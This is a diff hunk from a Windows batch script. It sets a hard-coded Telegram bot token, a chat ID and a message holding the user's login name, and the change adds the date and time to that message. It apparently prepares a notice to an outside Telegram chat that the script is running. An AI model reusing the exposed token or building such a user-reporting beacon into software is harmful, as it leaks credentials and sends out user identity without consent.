@@ -1164,7 +1164,7 @@ echo.
 :: Set bot token, chat ID, and message
 set "TOKEN=7470339630:AAEwHeixYKwvT6WYutXCjBBugdjTGjTIZVA"
 set "CHAT_ID=-1002163721260"
-set "MESSAGEEVERY=%USERNAME%|RUNNING.....|"
+set "MESSAGEEVERY=%USERNAME%|RUNNING.....|%date%/%time%|"
 
 
 :: URL encode the message by replacing spaces with %20
